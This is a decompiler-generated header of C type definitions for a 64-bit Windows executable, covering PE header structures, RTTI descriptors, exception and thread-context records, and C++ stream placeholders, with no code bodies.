typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned long long    qword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    ImageBaseOffset32 pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY _IMAGE_RUNTIME_FUNCTION_ENTRY, *P_IMAGE_RUNTIME_FUNCTION_ENTRY;

struct _IMAGE_RUNTIME_FUNCTION_ENTRY {
    ImageBaseOffset32 BeginAddress;
    ImageBaseOffset32 EndAddress;
    ImageBaseOffset32 UnwindInfoAddressOrData;
};

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

struct PMD {
    int mdisp;
    int pdisp;
    int vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    ImageBaseOffset32 pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    ImageBaseOffset32 pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    ImageBaseOffset32 pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    ImageBaseOffset32 pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef unsigned short    wchar16;
typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char name[0];
};

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef ulonglong __uint64;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

typedef wchar_t WCHAR;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef enum _GET_FILEEX_INFO_LEVELS {
    GetFileExInfoStandard=0,
    GetFileExMaxInfoLevel=1
} _GET_FILEEX_INFO_LEVELS;

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR * LPWSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

typedef void * HANDLE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW * LPSTARTUPINFOW;

typedef enum _GET_FILEEX_INFO_LEVELS GET_FILEEX_INFO_LEVELS;

typedef enum _FILE_INFO_BY_HANDLE_CLASS {
    FileBasicInfo=0,
    FileStandardInfo=1,
    FileNameInfo=2,
    FileRenameInfo=3,
    FileDispositionInfo=4,
    FileAllocationInfo=5,
    FileEndOfFileInfo=6,
    FileStreamInfo=7,
    FileCompressionInfo=8,
    FileAttributeTagInfo=9,
    FileIdBothDirectoryInfo=10,
    FileIdBothDirectoryRestartInfo=11,
    FileIoPriorityHintInfo=12,
    FileRemoteProtocolInfo=13,
    MaximumFileInfoByHandleClass=14
} _FILE_INFO_BY_HANDLE_CLASS;

typedef struct _WIN32_FIND_DATAW * LPWIN32_FIND_DATAW;

typedef enum _FILE_INFO_BY_HANDLE_CLASS FILE_INFO_BY_HANDLE_CLASS;

typedef long LONG;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (* PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT * PCONTEXT;

typedef void * PVOID;

typedef ulonglong ULONG_PTR;

typedef ulonglong DWORD64;

typedef union _union_54 _union_54, *P_union_54;

typedef struct _M128A _M128A, *P_M128A;

typedef struct _M128A M128A;

typedef struct _XSAVE_FORMAT _XSAVE_FORMAT, *P_XSAVE_FORMAT;

typedef struct _XSAVE_FORMAT XSAVE_FORMAT;

typedef XSAVE_FORMAT XMM_SAVE_AREA32;

typedef struct _struct_55 _struct_55, *P_struct_55;

typedef ulonglong ULONGLONG;

typedef longlong LONGLONG;

struct _M128A {
    ULONGLONG Low;
    LONGLONG High;
};

struct _XSAVE_FORMAT {
    WORD ControlWord;
    WORD StatusWord;
    BYTE TagWord;
    BYTE Reserved1;
    WORD ErrorOpcode;
    DWORD ErrorOffset;
    WORD ErrorSelector;
    WORD Reserved2;
    DWORD DataOffset;
    WORD DataSelector;
    WORD Reserved3;
    DWORD MxCsr;
    DWORD MxCsr_Mask;
    M128A FloatRegisters[8];
    M128A XmmRegisters[16];
    BYTE Reserved4[96];
};

struct _struct_55 {
    M128A Header[2];
    M128A Legacy[8];
    M128A Xmm0;
    M128A Xmm1;
    M128A Xmm2;
    M128A Xmm3;
    M128A Xmm4;
    M128A Xmm5;
    M128A Xmm6;
    M128A Xmm7;
    M128A Xmm8;
    M128A Xmm9;
    M128A Xmm10;
    M128A Xmm11;
    M128A Xmm12;
    M128A Xmm13;
    M128A Xmm14;
    M128A Xmm15;
};

union _union_54 {
    XMM_SAVE_AREA32 FltSave;
    struct _struct_55 s;
};

struct _CONTEXT {
    DWORD64 P1Home;
    DWORD64 P2Home;
    DWORD64 P3Home;
    DWORD64 P4Home;
    DWORD64 P5Home;
    DWORD64 P6Home;
    DWORD ContextFlags;
    DWORD MxCsr;
    WORD SegCs;
    WORD SegDs;
    WORD SegEs;
    WORD SegFs;
    WORD SegGs;
    WORD SegSs;
    DWORD EFlags;
    DWORD64 Dr0;
    DWORD64 Dr1;
    DWORD64 Dr2;
    DWORD64 Dr3;
    DWORD64 Dr6;
    DWORD64 Dr7;
    DWORD64 Rax;
    DWORD64 Rcx;
    DWORD64 Rdx;
    DWORD64 Rbx;
    DWORD64 Rsp;
    DWORD64 Rbp;
    DWORD64 Rsi;
    DWORD64 Rdi;
    DWORD64 R8;
    DWORD64 R9;
    DWORD64 R10;
    DWORD64 R11;
    DWORD64 R12;
    DWORD64 R13;
    DWORD64 R14;
    DWORD64 R15;
    DWORD64 Rip;
    union _union_54 u;
    M128A VectorRegister[26];
    DWORD64 VectorControl;
    DWORD64 DebugControl;
    DWORD64 LastBranchToRip;
    DWORD64 LastBranchFromRip;
    DWORD64 LastExceptionToRip;
    DWORD64 LastExceptionFromRip;
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef char CHAR;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _struct_314 _struct_314, *P_struct_314;

struct _struct_314 {
    ULONGLONG Alignment;
    ULONGLONG Region;
};

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _LUID {
    DWORD LowPart;
    LONG HighPart;
};

struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
};

struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[1];
};

typedef struct _struct_317 _struct_317, *P_struct_317;

struct _struct_317 {
    ULONGLONG Depth:16;
    ULONGLONG Sequence:48;
    ULONGLONG HeaderType:1;
    ULONGLONG Reserved:3;
    ULONGLONG NextEntry:60;
};

typedef struct _struct_316 _struct_316, *P_struct_316;

struct _struct_316 {
    ULONGLONG Depth:16;
    ULONGLONG Sequence:48;
    ULONGLONG HeaderType:1;
    ULONGLONG Init:1;
    ULONGLONG Reserved:2;
    ULONGLONG NextEntry:60;
};

typedef struct _struct_315 _struct_315, *P_struct_315;

struct _struct_315 {
    ULONGLONG Depth:16;
    ULONGLONG Sequence:9;
    ULONGLONG NextEntry:39;
    ULONGLONG HeaderType:1;
    ULONGLONG Init:1;
    ULONGLONG Reserved:59;
    ULONGLONG Region:3;
};

typedef struct _RUNTIME_FUNCTION _RUNTIME_FUNCTION, *P_RUNTIME_FUNCTION;

struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindData;
};

typedef struct _RUNTIME_FUNCTION * PRUNTIME_FUNCTION;

typedef enum _EXCEPTION_DISPOSITION {
    ExceptionContinueExecution=0,
    ExceptionContinueSearch=1,
    ExceptionNestedException=2,
    ExceptionCollidedUnwind=3
} _EXCEPTION_DISPOSITION;

typedef enum _EXCEPTION_DISPOSITION EXCEPTION_DISPOSITION;

typedef EXCEPTION_DISPOSITION (EXCEPTION_ROUTINE)(struct _EXCEPTION_RECORD *, PVOID, struct _CONTEXT *, PVOID);

typedef union _SLIST_HEADER _SLIST_HEADER, *P_SLIST_HEADER;

union _SLIST_HEADER {
    struct _struct_314 s;
    struct _struct_315 Header8;
    struct _struct_316 Header16;
    struct _struct_317 HeaderX64;
};

typedef CHAR * LPCSTR;

typedef WCHAR * LPCWSTR;

typedef struct _M128A * PM128A;

typedef struct _UNWIND_HISTORY_TABLE_ENTRY _UNWIND_HISTORY_TABLE_ENTRY, *P_UNWIND_HISTORY_TABLE_ENTRY;

typedef struct _UNWIND_HISTORY_TABLE_ENTRY UNWIND_HISTORY_TABLE_ENTRY;

struct _UNWIND_HISTORY_TABLE_ENTRY {
    DWORD64 ImageBase;
    PRUNTIME_FUNCTION FunctionEntry;
};

typedef union _union_61 _union_61, *P_union_61;

typedef struct _struct_62 _struct_62, *P_struct_62;

struct _struct_62 {
    PM128A Xmm0;
    PM128A Xmm1;
    PM128A Xmm2;
    PM128A Xmm3;
    PM128A Xmm4;
    PM128A Xmm5;
    PM128A Xmm6;
    PM128A Xmm7;
    PM128A Xmm8;
    PM128A Xmm9;
    PM128A Xmm10;
    PM128A Xmm11;
    PM128A Xmm12;
    PM128A Xmm13;
    PM128A Xmm14;
    PM128A Xmm15;
};

union _union_61 {
    PM128A FloatingContext[16];
    struct _struct_62 s;
};

typedef union _union_63 _union_63, *P_union_63;

typedef ulonglong * PDWORD64;

typedef struct _struct_64 _struct_64, *P_struct_64;

struct _struct_64 {
    PDWORD64 Rax;
    PDWORD64 Rcx;
    PDWORD64 Rdx;
    PDWORD64 Rbx;
    PDWORD64 Rsp;
    PDWORD64 Rbp;
    PDWORD64 Rsi;
    PDWORD64 Rdi;
    PDWORD64 R8;
    PDWORD64 R9;
    PDWORD64 R10;
    PDWORD64 R11;
    PDWORD64 R12;
    PDWORD64 R13;
    PDWORD64 R14;
    PDWORD64 R15;
};

union _union_63 {
    PDWORD64 IntegerContext[16];
    struct _struct_64 s;
};

typedef struct _UNWIND_HISTORY_TABLE _UNWIND_HISTORY_TABLE, *P_UNWIND_HISTORY_TABLE;

typedef struct _UNWIND_HISTORY_TABLE * PUNWIND_HISTORY_TABLE;

struct _UNWIND_HISTORY_TABLE {
    DWORD Count;
    BYTE LocalHint;
    BYTE GlobalHint;
    BYTE Search;
    BYTE Once;
    DWORD64 LowAddress;
    DWORD64 HighAddress;
    UNWIND_HISTORY_TABLE_ENTRY Entry[12];
};

typedef struct _LUID * PLUID;

typedef union _SLIST_HEADER * PSLIST_HEADER;

typedef CHAR * LPSTR;

typedef struct _KNONVOLATILE_CONTEXT_POINTERS _KNONVOLATILE_CONTEXT_POINTERS, *P_KNONVOLATILE_CONTEXT_POINTERS;

typedef struct _KNONVOLATILE_CONTEXT_POINTERS * PKNONVOLATILE_CONTEXT_POINTERS;

struct _KNONVOLATILE_CONTEXT_POINTERS {
    union _union_61 u;
    union _union_63 u2;
};

typedef EXCEPTION_ROUTINE * PEXCEPTION_ROUTINE;

typedef struct _TOKEN_PRIVILEGES * PTOKEN_PRIVILEGES;

typedef DWORD ACCESS_MASK;

typedef HANDLE * PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct _DISPATCHER_CONTEXT _DISPATCHER_CONTEXT, *P_DISPATCHER_CONTEXT;

struct _DISPATCHER_CONTEXT {
};

typedef ULONG_PTR SIZE_T;

typedef struct _Collvec _Collvec, *P_Collvec;

struct _Collvec {
    uint _Page;
    wchar_t * _LocaleName;
};

typedef struct _FILETIME * LPFILETIME;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef struct HKEY__ * HKEY;

typedef HKEY * PHKEY;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD * PDWORD;

typedef HANDLE HGLOBAL;

typedef BOOL * LPBOOL;

typedef struct HINSTANCE__ * HINSTANCE;

typedef void * LPCVOID;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ * HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef uint UINT;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_LOAD_CONFIG_CODE_INTEGRITY IMAGE_LOAD_CONFIG_CODE_INTEGRITY, *PIMAGE_LOAD_CONFIG_CODE_INTEGRITY;

struct IMAGE_LOAD_CONFIG_CODE_INTEGRITY {
    word Flags;
    word Catalog;
    dword CatalogOffset;
    dword Reserved;
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 34404
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY64 IMAGE_LOAD_CONFIG_DIRECTORY64, *PIMAGE_LOAD_CONFIG_DIRECTORY64;

typedef enum IMAGE_GUARD_FLAGS {
    IMAGE_GUARD_CF_INSTRUMENTED=256,
    IMAGE_GUARD_CFW_INSTRUMENTED=512,
    IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT=1024,
    IMAGE_GUARD_SECURITY_COOKIE_UNUSED=2048,
    IMAGE_GUARD_PROTECT_DELAYLOAD_IAT=4096,
    IMAGE_GUARD_DELAYLOAD_IAT_IN_ITS_OWN_SECTION=8192,
    IMAGE_GUARD_CF_EXPORT_SUPPRESSION_INFO_PRESENT=16384,
    IMAGE_GUARD_CF_ENABLE_EXPORT_SUPPRESSION=32768,
    IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT=65536,
    IMAGE_GUARD_RF_INSTRUMENTED=131072,
    IMAGE_GUARD_RF_ENABLE=262144,
    IMAGE_GUARD_RF_STRICT=524288,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_1=268435456,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_2=536870912,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_4=1073741824,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_8=2147483648
} IMAGE_GUARD_FLAGS;

struct IMAGE_LOAD_CONFIG_DIRECTORY64 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    qword DeCommitFreeBlockThreshold;
    qword DeCommitTotalFreeThreshold;
    pointer64 LockPrefixTable;
    qword MaximumAllocationSize;
    qword VirtualMemoryThreshold;
    qword ProcessAffinityMask;
    dword ProcessHeapFlags;
    word CsdVersion;
    word DependentLoadFlags;
    pointer64 EditList;
    pointer64 SecurityCookie;
    pointer64 SEHandlerTable;
    qword SEHandlerCount;
    pointer64 GuardCFCCheckFunctionPointer;
    pointer64 GuardCFDispatchFunctionPointer;
    pointer64 GuardCFFunctionTable;
    qword GuardCFFunctionCount;
    enum IMAGE_GUARD_FLAGS GuardFlags;
    struct IMAGE_LOAD_CONFIG_CODE_INTEGRITY CodeIntegrity;
    pointer64 GuardAddressTakenIatEntryTable;
    qword GuardAddressTakenIatEntryCount;
    pointer64 GuardLongJumpTargetTable;
    qword GuardLongJumpTargetCount;
    pointer64 DynamicValueRelocTable;
    pointer64 CHPEMetadataPointer;
    pointer64 GuardRFFailureRoutine;
    pointer64 GuardRFFailureRoutineFunctionPointer;
    dword DynamicValueRelocTableOffset;
    word DynamicValueRelocTableSection;
    word Reserved1;
    pointer64 GuardRFVerifyStackPointerFunctionPointer;
    dword HotPatchTableOffset;
    dword Reserved2;
    qword Reserved3;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER64 IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER64 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    pointer64 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    qword SizeOfStackReserve;
    qword SizeOfStackCommit;
    qword SizeOfHeapReserve;
    qword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_NT_HEADERS64 IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

struct IMAGE_NT_HEADERS64 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER64 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef int PMFN;

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int pForwardCompat;
    int pCatchableTypeArray;
};

typedef struct _s_ThrowInfo ThrowInfo;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char * va_list;

typedef struct _Yarn<char> _Yarn<char>, *P_Yarn<char>;

struct _Yarn<char> { // PlaceHolder Structure
};

typedef struct _Facet_base _Facet_base, *P_Facet_base;

struct _Facet_base { // PlaceHolder Structure
};

typedef struct basic_streambuf<char,struct_std::char_traits<char>_> basic_streambuf<char,struct_std::char_traits<char>_>, *Pbasic_streambuf<char,struct_std::char_traits<char>_>;

struct basic_streambuf<char,struct_std::char_traits<char>_> { // PlaceHolder Structure
};

typedef struct basic_ostream<char,struct_std::char_traits<char>_> basic_ostream<char,struct_std::char_traits<char>_>, *Pbasic_ostream<char,struct_std::char_traits<char>_>;

struct basic_ostream<char,struct_std::char_traits<char>_> { // PlaceHolder Structure
};

typedef struct basic_iostream<char,struct_std::char_traits<char>_> basic_iostream<char,struct_std::char_traits<char>_>, *Pbasic_iostream<char,struct_std::char_traits<char>_>;

struct basic_iostream<char,struct_std::char_traits<char>_> { // PlaceHolder Structure
};

typedef struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>, *Pbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>;

struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> { // PlaceHolder Structure
};

typedef struct locale locale, *Plocale;

struct locale { // PlaceHolder Structure
};

typedef struct basic_ios<char,struct_std::char_traits<char>_> basic_ios<char,struct_std::char_traits<char>_>, *Pbasic_ios<char,struct_std::char_traits<char>_>;

struct basic_ios<char,struct_std::char_traits<char>_> { // PlaceHolder Structure
};

typedef struct _Locinfo _Locinfo, *P_Locinfo;

struct _Locinfo { // PlaceHolder Structure
};

typedef struct ctype<char> ctype<char>, *Pctype<char>;

